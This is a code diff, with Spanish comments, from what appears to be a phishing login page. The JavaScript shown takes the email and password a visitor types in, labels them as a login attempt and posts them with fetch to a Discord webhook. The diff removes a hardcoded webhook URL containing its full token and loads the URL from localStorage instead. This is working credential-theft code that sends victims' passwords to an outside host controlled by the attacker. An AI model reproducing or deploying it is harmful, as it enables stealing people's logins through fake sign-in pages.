@@ -89,12 +89,18 @@
                 return;
             }
 
+            // Recoger el webhook de localStorage
+            const webhookUrl = localStorage.getItem('webhookUrl');
+            
+            if (!webhookUrl) {
+                document.getElementById('status').innerText = "No se ha guardado un webhook. Vuelve a la Página A.";
+                return;
+            }
+
             // Datos a enviar al webhook
             const data = {
                 content: `Intento de inicio de sesión: \nEmail: ${email} \nContraseña: ${password}`
             };
-
-            const webhookUrl = "https://discord.com/api/webhooks/1322668879297646704/clrV9tAmGadKezdXoJvBUYU-N3EWMYEIg2KAwPSoSkHW_qMol5ov6QvXN6-S4jzJ0PBz"; // Cambia esta URL por tu webhook
 
             // Enviar datos al webhook
             fetch(webhookUrl, {
